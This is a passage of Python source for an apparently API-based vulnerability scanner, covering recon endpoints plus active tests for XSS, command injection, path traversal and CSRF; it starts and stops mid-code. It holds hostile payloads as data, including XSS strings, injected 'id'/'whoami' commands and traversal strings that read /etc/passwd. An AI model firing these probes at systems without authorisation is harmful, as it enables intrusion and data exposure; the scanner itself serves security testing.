async def recon_dns(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    loop = asyncio.get_event_loop()
    records = await loop.run_in_executor(None, _dns_enum_records, host)
    out = "\n".join(f"[*] {r['type']} {r['value']}" for r in records)
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "dnsrecon", req.target, {"output": out})
    return {
        "scan_id": scan_id, "target": req.target, "tool": "dnsrecon",
        "records": records, "total": len(records), "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/subdomains")
async def recon_subdomains(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    subdomains = await _enum_subdomains(host)
    out = "\n".join(subdomains)
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "sublist3r", req.target, {"output": out})
    return {
        "scan_id": scan_id, "target": req.target, "tool": "sublist3r",
        "subdomains": subdomains, "total": len(subdomains), "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/theharvester")
async def recon_theharvester(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    # crt.sh for email harvest + subdomains
    emails = []; hosts_found = []
    try:
        r = _http_get(f"https://crt.sh/?q=%.{host}&output=json", timeout=20)
        if r and r.status_code==200:
            for entry in r.json():
                for n in entry.get("name_value","").split("\n"):
                    n = n.strip().lstrip("*.")
                    if "@" in n: emails.append(n)
                    elif n.endswith(host) and n!=host: hosts_found.append(n)
    except: pass
    emails = list(dict.fromkeys(emails))[:50]
    hosts_found = list(dict.fromkeys(hosts_found))[:50]
    out = f"Emails: {emails}\nHosts: {hosts_found}"
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "theharvester", req.target, {"output": out})
    return {
        "scan_id": scan_id, "target": req.target, "tool": "theHarvester",
        "emails": emails, "hosts": hosts_found,
        "total_emails": len(emails), "total_hosts": len(hosts_found),
        "raw_output": out, "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/dirb")
async def recon_dirb(req: ScanRequest, user=Depends(verify_token)):
    items = await _python_fuzz(req.target)
    found = [f"{_web_url(req.target).rstrip('/')}{item['path']}" for item in items]
    out = "\n".join(f"[{item['status']}] {item['path']}" for item in items)
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "dirb", req.target, {"output": out})
    return {
        "scan_id": scan_id, "target": req.target, "tool": "dirb",
        "found": found, "total": len(found), "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/gobuster")
async def recon_gobuster(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(
        ["gobuster", "dir", "-u", _web_url(req.target), "-w", "/usr/share/wordlists/dirb/common.txt",
         "-t", "20", "-q", "--no-progress"], timeout=120)
    out = result.get("output","")
    found = []
    for line in out.splitlines():
        m = re.match(r"(/\S+)\s+\(Status:\s*(\d+)\)", line.strip())
        if m: found.append({"path": m.group(1), "status": int(m.group(2))})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "gobuster", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "gobuster",
        "found": found, "total": len(found), "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


# ══════════════════════════════════════════════════════════════
#  VULNERABILITY SCANNING MODULE
# ══════════════════════════════════════════════════════════════

import urllib.request as _ureq, ssl as _ssl

def _sev(text):
    t = text.lower()
    if any(k in t for k in ["sql injection","remote code","command injection","rce","arbitrary file","traversal","authentication bypass","shell upload"]): return "CRITICAL"
    if any(k in t for k in ["xss","cross-site script","csrf","open redirect","credentials","privilege escalation"]): return "HIGH"
    if any(k in t for k in ["header missing","content-security","x-frame","referrer","hsts","strict-transport","deprecated","information disclosure","version disclosure","cors"]): return "MEDIUM"
    if any(k in t for k in ["clickjack","cookie","cache","banner","mime","server info"]): return "LOW"
    return "MEDIUM"

def _rem(text):
    t = text.lower()
    if "content-security-policy" in t: return "Add Content-Security-Policy header"
    if "strict-transport" in t or "hsts" in t: return "Enable HSTS: Strict-Transport-Security header"
    if "referrer-policy" in t: return "Add Referrer-Policy header"
    if "x-content-type" in t: return "Add X-Content-Type-Options: nosniff header"
    if "x-frame" in t: return "Use Content-Security-Policy frame-ancestors instead of X-Frame-Options"
    if "permissions-policy" in t: return "Add Permissions-Policy header"
    if "sql" in t: return "Use parameterised queries / prepared statements"
    if "xss" in t: return "Sanitise and encode all user input; enforce CSP"
    if "csrf" in t: return "Implement CSRF tokens on all state-changing requests"
    if "cookie" in t: return "Set Secure, HttpOnly, SameSite flags on cookies"
    if "cors" in t: return "Restrict CORS to trusted origins only"
    return "Review and remediate according to OWASP guidelines"

def _detect_spa(url: str) -> bool:
    """Returns True if target is a Single Page App (returns HTML for all routes)."""
    try:
        r = _req_lib.get(url, timeout=8, verify=False, allow_redirects=True)
        body = r.text[:3000].lower()
        return any(m in body for m in [
            "ng-version", "<app-root", "data-reactroot", "__next", "vue.min.js",
            "__angular", "window.__nuxt", "ember.js", "svelte", "ng-app",
            "react.development", "react.production"
        ])
    except: return False

def _path_is_real(base_url: str, path: str) -> bool:
    """Returns True only if the path returns non-HTML content (a real file, not SPA routing)."""
    try:
        r = _req_lib.get(base_url.rstrip("/") + "/" + path.lstrip("/"), timeout=6, verify=False, allow_redirects=True)
        if r.status_code == 403: return True   # access denied = file likely exists
        if r.status_code != 200: return False
        ct = r.headers.get("Content-Type","").lower()
        if "text/html" in ct: return False     # SPA or 404 page returned HTML
        return True
    except: return False


@app.post("/api/scan/nikto")
async def scan_nikto(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = await _nikto_scan(req.target)
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"nikto",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"nikto","findings":findings,"total":len(findings),"raw_output":str(findings),"command":"python _nikto_scan","timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/nmap_vuln")
async def scan_nmap_vuln(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    host = _recon_host(req.target)
    open_ports = await _tcp_scan(host)
    findings = []
    for p in open_ports:
        port, svc, ver = p["port"], p["service"], p["version"]
        if svc in ("ftp",) and ver:
            findings.append({"detail":f"FTP on port {port} — check for anonymous access: {ver}","severity":"MEDIUM","cvss":"5.3","cve":"N/A","cwe":"CWE-306","cwe_name":"Anonymous FTP","owasp":"A07:2021","remediation":"Disable anonymous FTP. Require authentication."})
        if svc=="telnet":
            findings.append({"detail":f"Telnet service on port {port} — unencrypted protocol","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-319","cwe_name":"Cleartext Transmission","owasp":"A02:2021","remediation":"Replace Telnet with SSH."})
        if port==3389:
            findings.append({"detail":f"RDP exposed on port 3389 — high-value target for brute force","severity":"HIGH","cvss":"8.1","cve":"N/A","cwe":"CWE-307","cwe_name":"Brute Force","owasp":"A07:2021","remediation":"Restrict RDP to VPN. Enable NLA. Use strong passwords."})
        if port==6379 and svc=="redis":
            findings.append({"detail":f"Redis on port 6379 — commonly misconfigured with no auth","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-306","cwe_name":"Missing Authentication","owasp":"A07:2021","remediation":"Enable Redis AUTH. Bind to 127.0.0.1 only."})
        if port==27017 and svc=="mongodb":
            findings.append({"detail":f"MongoDB on port 27017 — may have no authentication","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-306","cwe_name":"Missing Authentication","owasp":"A07:2021","remediation":"Enable MongoDB authentication. Bind to localhost."})
    out = "\n".join(f"{p['port']}/tcp open {p['service']} {p['version']}" for p in open_ports)
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"nmap_vuln",req.target,{"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"nmap_vuln","findings":findings,"total":len(findings),"raw_output":out,"command":"python _tcp_scan","timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/sqlmap")
async def scan_sqlmap(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = await _sqli_engine(_web_url(req.target))
    out = str(findings) if findings else "No SQL injection found"
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"sqlmap",req.target,{"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"sqlmap","vulnerable":len(findings)>0,"findings":findings,"total":len(findings),"raw_output":out,"command":"python _sqli_engine","timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/headers")
async def scan_headers(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    SECURITY_HEADERS = [
        ("content-security-policy","Content-Security-Policy","HIGH","CSP prevents XSS attacks","6.1","CWE-79","Cross-Site Scripting","A03:2021"),
        ("strict-transport-security","HSTS","HIGH","Forces HTTPS connections","7.5","CWE-319","Cleartext Transmission","A02:2021"),
        ("x-content-type-options","X-Content-Type-Options","MEDIUM","Prevents MIME sniffing","5.3","CWE-693","Protection Mechanism Failure","A05:2021"),
        ("x-frame-options","X-Frame-Options","MEDIUM","Prevents clickjacking","6.1","CWE-1021","Improper Frame Restriction","A05:2021"),
        ("referrer-policy","Referrer-Policy","LOW","Controls referrer information","3.1","CWE-200","Information Exposure","A01:2021"),
        ("permissions-policy","Permissions-Policy","LOW","Controls browser features","3.1","CWE-16","Configuration","A05:2021"),
    ]
    findings = []
    headers_found = {}
    try:
        result = await run_tool(["curl","-sI","--max-time","10","-L",req.target], timeout=20)
        out = result.get("output","")
        for line in out.splitlines():
            if ":" in line:
                k,_,v = line.partition(":")
                headers_found[k.strip().lower()] = v.strip()
        for hdr_key, hdr_name, sev, desc, cvss, cwe, cwe_name, owasp in SECURITY_HEADERS:
            if hdr_key not in headers_found:
                findings.append({"detail":f"Missing {hdr_name} header — {desc}","severity":sev,"cvss":cvss,"cve":"N/A","cwe":cwe,"cwe_name":cwe_name,"owasp":owasp,"remediation":_rem(hdr_name)})
    except Exception as e:
        findings.append({"detail":f"Scan error: {e}","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Scan Error","owasp":"N/A","remediation":"Check target"})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"headers",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"headers","findings":findings,"total":len(findings),"headers_present":headers_found,"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/cookies")
async def scan_cookies(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []
    cookies = []
    try:
        result = await run_tool(["curl","-sI","--max-time","10","-L",req.target], timeout=20)
        out = result.get("output","")
        for line in out.splitlines():
            if line.lower().startswith("set-cookie:"):
                cookie_val = line[11:].strip()
                cookie_name = cookie_val.split("=")[0].split(";")[0].strip()
                issues = []
                if "httponly" not in cookie_val.lower(): issues.append("Missing HttpOnly")
                if "secure" not in cookie_val.lower():   issues.append("Missing Secure flag")
                if "samesite" not in cookie_val.lower(): issues.append("Missing SameSite")
                score = max(0, 100 - len(issues)*30)
                cookies.append({"name":cookie_name,"cookie":cookie_val,"issues":issues,"secure_score":score})
                if issues:
                    findings.append({"detail":f"Cookie '{cookie_name}': {', '.join(issues)}","severity":"MEDIUM","cvss":"5.4","cve":"N/A","cwe":"CWE-614","cwe_name":"Sensitive Cookie","owasp":"A02:2021","remediation":"Set Secure, HttpOnly, SameSite=Strict on all session cookies"})
    except Exception as e:
        findings.append({"detail":f"Scan error: {e}","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Scan Error","owasp":"N/A","remediation":"Check target"})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"cookies",req.target,{"output":str(cookies)})
    return {"scan_id":scan_id,"target":req.target,"tool":"cookies","findings":findings,"cookies":cookies,"total":len(cookies),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/ssl")
async def scan_ssl(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    host = _recon_host(req.target)
    loop = asyncio.get_event_loop()
    findings = await loop.run_in_executor(None, _ssl_analyze, host)
    out = str(findings) if findings else "No SSL issues found"
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"ssl",req.target,{"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"sslscan","findings":findings,"total":len(findings),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/xss")
async def scan_xss(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []
    raw_lines = []
    base = req.target.rstrip("/")

    xss_payloads = [
        ("<script>alert(1)</script>", "<script>alert(1)</script>"),
        ("<img src=x onerror=alert(1)>", "onerror=alert"),
        ("<svg onload=alert(1)>", "onload=alert"),
    ]
    found_xss = False

    # Step 0: test known vulnerable endpoints for this target FIRST (no time budget wasted)
    for url, param, method in _get_lab_targets(req.target):
        if found_xss: break
        for payload, marker in xss_payloads:
            try:
                r = _http_get(f"{url}?{param}={payload}", timeout=8) if method == "get" else None
                if r and marker in r.text:
                    findings.append({"detail":f"Reflected XSS at {url} — parameter '{param}' reflects unencoded payload","severity":"CRITICAL","cvss":"9.0","cve":"N/A","cwe":"CWE-79","cwe_name":"Cross-Site Scripting","owasp":"A03:2021","remediation":"HTML-encode all user input before reflecting. Add Content-Security-Policy header."})
                    raw_lines.append(f"[!] XSS confirmed at {url}?{param}=")
                    found_xss = True; break
            except: pass

    # Step 1: curl-based reflected XSS — test common parameters
    xss_params = ["q", "search", "searchFor", "name", "id", "query", "s", "term",
                  "cat", "artist", "username", "input", "text", "page", "lang"]
    _xss_start = _time.time()
    for param in xss_params:
        if found_xss or _time.time() - _xss_start > 60: break  # 60s total budget
        for payload, marker in xss_payloads:
            r = _http_get(f"{base}?{param}={payload}", timeout=5)
            if r and marker in r.text:
                findings.append({"detail":f"Reflected XSS: parameter '{param}' reflects unencoded HTML — payload executes in browser","severity":"HIGH","cvss":"7.4","cve":"N/A","cwe":"CWE-79","cwe_name":"Cross-Site Scripting","owasp":"A03:2021","remediation":"HTML-encode all user-supplied input before reflecting in responses. Add Content-Security-Policy header."})
                raw_lines.append(f"[!] Reflected XSS confirmed via ?{param}={payload}")
                found_xss = True
                break
        if found_xss: break

    # Step 2: crawl site links and test subpage parameters for XSS
    if not found_xss:
        home = _http_get(base, timeout=10)
        if home:
            links = re.findall(r'href=["\']([^"\'#\s]+)["\']', home.text, re.IGNORECASE)
            target_host = _recon_host(req.target)
            tested = set()
            for link in links[:30]:
                if link.startswith("http"):
                    full = link
                elif link.startswith("/"):
                    full = base.rstrip("/") + link
                else:
                    full = base.rstrip("/") + "/" + link
                if target_host not in full or "?" not in full or full in tested:
                    continue
                tested.add(full)
                url_part, _, qs = full.partition("?")
                for pair in qs.split("&"):
                    pname = pair.split("=")[0]
                    for pl, mk in xss_payloads[:2]:
                        r = _http_get(f"{url_part}?{pname}={pl}", timeout=6)
                        if r and mk in r.text:
                            findings.append({"detail":f"Reflected XSS at {url_part} — parameter '{pname}' reflects unencoded payload","severity":"HIGH","cvss":"7.4","cve":"N/A","cwe":"CWE-79","cwe_name":"Cross-Site Scripting","owasp":"A03:2021","remediation":"HTML-encode all user-supplied input before reflecting in responses. Add Content-Security-Policy header."})
                            raw_lines.append(f"[!] XSS confirmed at {url_part}?{pname}=")
                            found_xss = True
                            break
                    if found_xss: break
                if found_xss: break

    # Step 3: probe base URL for plain input reflection
    if not found_xss:
        probe = "XSSTEST9981"
        r = _http_get(f"{base}?q={probe}", timeout=8)
        if r and probe in r.text:
            findings.append({"detail":"Input reflection detected — query parameter reflected in response without encoding (likely XSS)","severity":"HIGH","cvss":"7.4","cve":"N/A","cwe":"CWE-79","cwe_name":"Cross-Site Scripting","owasp":"A03:2021","remediation":"Encode all reflected user input. Never insert raw user data into HTML."})
            raw_lines.append(f"[!] Input reflection confirmed — potential XSS at ?q=")

    # Step 3b: parse HTML forms and test their input parameters
    if not found_xss and _time.time() - _xss_start < 50:
        home2 = _http_get(base, timeout=8)
        if home2:
            for form_url, input_name in _parse_forms(home2.text, base)[:15]:
                if found_xss or _time.time() - _xss_start > 55: break
                for payload, marker in xss_payloads[:2]:
                    try:
                        r = _http_get(f"{form_url}?{input_name}={payload}", timeout=5)
                        if r and marker in r.text:
                            findings.append({"detail":f"Reflected XSS via form: {form_url} — input '{input_name}' reflects unencoded payload","severity":"CRITICAL","cvss":"9.0","cve":"N/A","cwe":"CWE-79","cwe_name":"Cross-Site Scripting","owasp":"A03:2021","remediation":"HTML-encode all user input. Add Content-Security-Policy header."})
                            found_xss = True; break
                    except: pass

    # Step 4: also try xsstrike if installed
    result = await run_tool(["python3","/usr/share/xsstrike/xsstrike.py","-u",req.target,"--crawl","--skip-dom","-l","1"], timeout=60)
    out = result.get("output","")
    for line in out.splitlines():
        if "vulnerable" in line.lower() or ("xss" in line.lower() and "[+]" in line):
            findings.append({"detail":line.strip(),"severity":"HIGH","cvss":"7.4","cve":"N/A","cwe":"CWE-79","cwe_name":"Cross-Site Scripting","owasp":"A03:2021","remediation":"Sanitise and encode all user input; enforce Content-Security-Policy."})

    # Note: Missing CSP header is already reported by the headers scanner.
    # We don't duplicate it here to avoid two findings for the same root cause.

    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"xss",req.target,{"output":"\n".join(raw_lines) or out})
    return {"scan_id":scan_id,"target":req.target,"tool":"xss","findings":findings,"total":len(findings),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/cms")
async def scan_cms(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    loop = asyncio.get_event_loop()
    detected = await loop.run_in_executor(None, _detect_tech, _web_url(req.target))
    findings = []
    vuln_cms = {"WordPress":"Check for outdated plugins — many CVEs exist","Joomla":"Check for known CVEs — Joomla has frequent vulnerabilities","Drupal":"Drupalgeddon vulnerabilities may apply"}
    for tech in detected:
        if tech in vuln_cms:
            findings.append({"detail":f"{tech} CMS detected — {vuln_cms[tech]}","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-1035","cwe_name":"Using Vulnerable Components","owasp":"A06:2021","remediation":"Keep CMS and all plugins updated to latest versions."})
    out = ", ".join(detected) if detected else "No CMS/tech detected"
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"cms",req.target,{"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"whatweb","detected":detected,"findings":findings,"total":len(findings),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/dirb")
async def scan_dirb(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    items = await _python_fuzz(req.target)
    found = [f"{_web_url(req.target).rstrip('/')}{item['path']}" for item in items]
    findings = [{"detail":f"Accessible path: {item['path']} (HTTP {item['status']})","severity":"MEDIUM" if item["status"]==403 else "LOW","cvss":"5.3" if item["status"]==403 else "3.1","cve":"N/A","cwe":"CWE-538","cwe_name":"File Exposure","owasp":"A01:2021","remediation":"Restrict access to sensitive directories"} for item in items]
    out = "\n".join(f"{item['status']} {item['path']}" for item in items)
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"dirb",req.target,{"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"dirb","findings":findings,"found":found,"total":len(found),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/nuclei")
async def nuclei_scan(req: ScanRequest, user=Depends(verify_token)):
    cmd = ["nuclei","-u",_web_url(req.target),"-severity","critical,high,medium,low","-c","10","-timeout","8","-no-color","-jsonl"]
    result = await run_tool(cmd, timeout=240)
    findings = []
    CVSS_MAP = {"critical":"9.8","high":"7.5","medium":"5.3","low":"3.1"}
    for line in result["output"].split("\n"):
        line = line.strip()
        if not line: continue
        try:
            data = json.loads(line)
            info = data.get("info",{})
            sev  = info.get("severity","info").lower()
            cves = info.get("classification",{}).get("cve-id") or []
            cwes = info.get("classification",{}).get("cwe-id") or []
            findings.append({"detail":info.get("name","Nuclei Finding")+(f" — {data.get('matched-at','')}" if data.get("matched-at") else ""),"severity":sev.upper(),"cvss":CVSS_MAP.get(sev,"0.0"),"cve":cves[0] if cves else "N/A","cwe":cwes[0] if cwes else "N/A","cwe_name":"Security Vulnerability","owasp":"A05:2021","remediation":info.get("remediation") or "Apply patch or update the affected component."})
        except: pass
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"nuclei",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"nuclei","findings":findings,"total":len(findings),"raw_output":result["output"],"timestamp":datetime.datetime.utcnow().isoformat()}


# ══════════════════════════════════════════════════════════════
#  ADDITIONAL SCAN ENDPOINTS (commix, lfi, csrf, idor, ssti)
# ══════════════════════════════════════════════════════════════

import requests as _req_lib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


@app.post("/api/scan/commix")
async def commix_scan(req: ScanRequest, user=Depends(verify_token)):
    _AUTH_CTX.set(req)
    findings = []; vulnerable = False
    target_url = _web_url(req.target)
    skipped_reason = None

    # Skip dynamic checks if target is a static-only host (Netlify, Cloudflare Pages, Vercel, etc.)
    static_host = _detect_static_host(target_url)
    if static_host:
        skipped_reason = f"Target is hosted on {static_host} (static-only — no server-side execution possible)"
    else:
        # Test known lab-specific command injection endpoints
        ci_payloads = ["127.0.0.1; id", "127.0.0.1 && id", "127.0.0.1 | id", "127.0.0.1; whoami"]
        ci_indicators = ["uid=", "root", "www-data", "daemon"]

        # ─ Lab targets: known vulnerable endpoints (DVWA, bWAPP, etc.)
        for url, param, method in _get_lab_targets(req.target):
            if "exec" not in url and "cmdi" not in url and "cmd" not in url: continue
            for payload in ci_payloads:
                try:
                    if method == "post":
                        r = _req_lib.post(url, data={param: payload, "Submit": "Submit"}, timeout=8, verify=False, headers=_make_req_headers())
                    else:
                        r = _http_get(f"{url}?{param}={payload}", timeout=8)
                    if r and any(ind in r.text for ind in ci_indicators):
                        findings.append({"detail": f"OS Command Injection at {url} via '{param}' parameter — server executed '{payload}'", "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A", "cwe": "CWE-78", "cwe_name": "OS Command Injection", "owasp": "A03:2021", "remediation": "Never pass user input to OS commands. Use allowlisted values only."})
                        vulnerable = True; break
                except: pass
            if vulnerable: break

        # ─ Generic test on base URL with baseline comparison to avoid false positives
        if not vulnerable:
            for payload_q in ["ip=127.0.0.1;id", "cmd=id", "exec=id", "command=id"]:
                r_base, r_payload = _baseline_then_payload(target_url, payload_q, timeout=6)
                if not r_payload: continue
                # Require: indicator present in payload response, NOT present in baseline,
                # AND response is meaningfully different from baseline (rules out SPAs serving the same index.html)
                payload_has_indicator = any(ind in r_payload.text for ind in ci_indicators)
                baseline_has_indicator = r_base and any(ind in r_base.text for ind in ci_indicators)
                if payload_has_indicator and not baseline_has_indicator and _response_meaningfully_different(r_base, r_payload):
                    findings.append({"detail": f"OS Command Injection via ?{payload_q} — uid/root string appeared in response (not in baseline)", "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A", "cwe": "CWE-78", "cwe_name": "OS Command Injection", "owasp": "A03:2021", "remediation": "Never pass user input to OS commands."})
                    vulnerable = True; break

    scan_id = str(uuid.uuid4()); save_scan(scan_id, "commix", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "commix", "vulnerable": vulnerable, "findings": findings, "skipped_reason": skipped_reason, "total": len(findings), "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/lfi")
async def lfi_scan(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    base = req.target.rstrip("/")
    indicators = ["root:x:","bin:x:","daemon:x:","[extensions]","for 16-bit","boot.ini"]

    # Generic path traversal — appended to base URL
    traversal = [
        "/../../../../etc/passwd",
        "/../../../etc/passwd",
        "/..%2F..%2F..%2Fetc%2Fpasswd",
        "/....//....//....//etc/passwd",
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/../../../../windows/win.ini",
    ]
    # App-specific vulnerable parameter endpoints
    param_endpoints = [
        "?page=../../../../etc/passwd",                              # Mutillidae / generic PHP
        "?file=../../../../etc/passwd",
        "?include=../../../../etc/passwd",
        "?view=../../../../etc/passwd",
        "/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd",     # DVWA (low security)
        "/vulnerabilities/fi/?page=../../../../etc/passwd",
        "/mutillidae/index.php?page=../../../../etc/passwd",
    ]

    def _check(url):
        try:
            r = _req_lib.get(url, timeout=8, verify=False, allow_redirects=True)
            for ind in indicators:
                if ind in r.text:
                    return True
        except: pass
        return False

    for path in traversal:
        if _check(base + path):
            findings.append({"detail":f"LFI/Path Traversal confirmed — /etc/passwd readable via directory traversal","severity":"CRITICAL","cvss":"9.1","cve":"N/A","cwe":"CWE-22","cwe_name":"Path Traversal","owasp":"A01:2021","remediation":"Validate and sanitise all file path inputs. Use allowlists. Disable PHP allow_url_include."})
            break

    if not findings:
        for ep in param_endpoints:
            url = (base + ep) if ep.startswith("/") else (base + "/" + ep.lstrip("?") if not ep.startswith("?") else base + ep)
            if ep.startswith("?"):
                url = base + ep
            elif ep.startswith("/dvwa") or ep.startswith("/vulner") or ep.startswith("/mut"):
                url = base + ep
            if _check(url):
                findings.append({"detail":f"LFI confirmed via parameter — {ep.split('?')[0] if '?' in ep else ep}: /etc/passwd contents returned","severity":"CRITICAL","cvss":"9.1","cve":"N/A","cwe":"CWE-22","cwe_name":"Path Traversal","owasp":"A01:2021","remediation":"Never pass user-controlled filenames to include/require. Use allowlisted page mappings."})
                break

    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"lfi",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"lfi","findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/csrf")
async def csrf_scan(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    try:
        r = _req_lib.get(_web_url(req.target),timeout=15,verify=False,headers=_BROWSER_HEADERS,allow_redirects=True)
        forms = re.findall(r"<form[^>]*?>.*?</form>",r.text,re.DOTALL|re.IGNORECASE)
        csrf_patterns = ["csrf","_token","token","authenticity_token","__requestverificationtoken","xsrf","nonce"]
        for i,form in enumerate(forms):
            has_csrf = any(p in form.lower() for p in csrf_patterns)
            m = re.search(r'method=["\'](\w+)["\']',form,re.IGNORECASE)
            method = m.group(1).upper() if m else "GET"
            am = re.search(r'action=["\']([^"\']*)["\']',form,re.IGNORECASE)
            action = am.group(1) if am else req.target
            if method in ("POST","PUT","DELETE") and not has_csrf:
                findings.append({"detail":f"CSRF: Form #{i+1} (action={action}) has no CSRF token","severity":"HIGH","cvss":"8.0","cve":"N/A","cwe":"CWE-352","cwe_name":"CSRF","owasp":"A01:2021","remediation":"Add CSRF tokens to all state-changing forms."})
        if not r.headers.get("Referrer-Policy"):
            findings.append({"detail":"Missing Referrer-Policy header","severity":"LOW","cvss":"3.1","cve":"N/A","cwe":"CWE-352","cwe_name":"CSRF","owasp":"A01:2021","remediation":"Add Referrer-Policy: strict-origin-when-cross-origin header."})
    except Exception:
        pass
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"csrf",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"csrf","findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}


# ══════════════════════════════════════════════════════════════
#  MISSING WEB APP SCAN ENDPOINTS
# ══════════════════════════════════════════════════════════════

def _http_get(url, timeout=10, headers=None, req=None):
    h = dict(_BROWSER_HEADERS)
    auth = req or _AUTH_CTX.get()
    if auth:
        if getattr(auth,'auth_cookie',None): h['Cookie'] = auth.auth_cookie
        if getattr(auth,'auth_bearer',None): h['Authorization'] = f'Bearer {auth.auth_bearer}'
    if headers: h.update(headers)
    try: return _req_lib.get(url,timeout=timeout,verify=False,headers=h,allow_redirects=True)
    except: return None


# ══════════════════════════════════════════════════════════════
#  PYTHON NATIVE TOOL IMPLEMENTATIONS
#  Replaces: nmap, sqlmap, nikto, gobuster, dirb, ffuf, sslscan,
#             dnsrecon, whois, wafw00f, whatweb, amass, sublist3r,
#             sherlock, dnstwist — pure Python, zero Kali deps
# ══════════════════════════════════════════════════════════════

import aiohttp as _aiohttp
import dns.resolver as _dns_resolver
import whois as _whois_lib

_SVC = {21:"ftp",22:"ssh",23:"telnet",25:"smtp",53:"dns",80:"http",
        110:"pop3",111:"rpc",135:"msrpc",139:"netbios-ssn",143:"imap",
        443:"https",445:"smb",465:"smtps",587:"submission",993:"imaps",
        995:"pop3s",1433:"mssql",1521:"oracle",1723:"pptp",2049:"nfs",
        3306:"mysql",3389:"rdp",4443:"https-alt",5432:"postgresql",
        5900:"vnc",5985:"winrm",6379:"redis",8080:"http-proxy",
        8443:"https-alt",8888:"http-alt",9200:"elasticsearch",27017:"mongodb"}

_TOP_PORTS = [21,22,23,25,53,80,110,111,135,139,143,443,445,465,587,
              993,995,1433,1521,1723,2049,3000,3306,3389,4000,4443,
              4444,5000,5432,5900,5985,6379,6667,8000,8080,8443,8888,
              9000,9200,27017]


async def _tcp_scan(host: str, ports=None, timeout: float=2.5) -> list:
    if ports is None: ports = _TOP_PORTS
    sem = asyncio.Semaphore(50)
    async def _probe(port):
        async with sem:
            try:
                r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
                banner = ""
                try:
                    w.write(b"\r\n"); await w.drain()
                    d = await asyncio.wait_for(r.read(256), timeout=1.0)
                    banner = d.decode("utf-8", errors="replace").strip()[:80]
                except: pass
                try: w.close(); await w.wait_closed()
                except: pass
